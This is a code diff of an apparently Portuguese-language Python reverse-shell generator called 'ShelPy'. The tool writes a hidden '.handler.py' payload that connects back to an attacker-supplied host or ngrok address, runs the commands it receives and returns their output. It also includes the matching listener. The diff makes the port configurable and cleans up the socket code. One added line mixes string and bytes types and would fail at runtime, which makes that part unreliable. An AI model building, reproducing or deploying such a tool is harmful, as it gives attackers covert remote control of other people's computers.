@@ -4,7 +4,7 @@
 import os, time, socket
 
 def criar():
-	ngrok = input("\033[01;32m[*]\033[0m"+" Ngrok [y/n]> ")
+	ngrok = input("\033[01;32m[*]\033[0m"+" Ngrok [y/N]> ")
 
 	if ngrok == "y":
 		ip = input("\033[01;34m[+]\033[0m"+" IP ngrok> ")
@@ -23,7 +23,7 @@ arq = open(".handler.py", "w")
 arq.write('''#coding: utf-8
 import socket, os, subprocess
 
-s = socket.socket()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = {}
 port = {}
 
@@ -42,10 +42,7 @@ while True:
 		
 		output_bytes = cmd.stdout.read() + cmd.stderr.read()
 
-		if 'Arquivo ou diretório não encontrado' or 'File or directory not found' in str(output_bytes, 'utf-8'):
-			output_str = str(cmd.stdout.read(), 'utf-8')
-		else:
-			output_str = str(output_bytes, 'utf-8')
+		output_str = str(output_bytes, 'utf-8')
 
 		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
 ''')
@@ -66,9 +63,9 @@ os.system("python3 .handler.py &>> /dev/null")
 				global host, port, s
 				
 				host = ''
-				port = 1337
+				port = int(porta)
 
-				s = socket.socket()
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 			except socket.error as msg:
 				print('\033[01;31m[!]\033[0m Erro na criação do socket: {}'.format(msg))
@@ -135,7 +132,7 @@ arq = open(".handler.py", "w")
 arq.write('''#coding: utf-8
 import socket, os, subprocess
 
-s = socket.socket()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = {}
 port = {}
 
@@ -154,12 +151,9 @@ while True:
 		
 		output_bytes = cmd.stdout.read() + cmd.stderr.read()
 
-		if 'Arquivo ou diretório não encontrado' or 'File or directory not found' in str(output_bytes, 'utf-8'):
-			output_str = str(cmd.stdout.read(), 'utf-8')
-		else:
-			output_str = str(output_bytes, 'utf-8')
+		output_str = str(output_bytes, 'utf-8')
 
-		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+		s.send(str.encode(output_str + str.encode('\033[01;31mShelPy\033[0m', 'utf-8') + str(os.getcwd()) + '> '))
 ''')
 
 arq.close()
@@ -178,7 +172,7 @@ os.system("python3 .handler.py &>> /dev/null")
 				global host, port, s
 				
 				host = ''
-				port = 1337
+				port = int(porta)
 
 				s = socket.socket()
 
@@ -240,9 +234,9 @@ def handler():
 			global host, port, s
 			
 			host = ''
-			port = 1337
+			port = int(porta)
 
-			s = socket.socket()
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 		except socket.error as msg:
 			print('\033[01;31m[!]\033[0m Erro na criação do socket: {}'.format(msg))
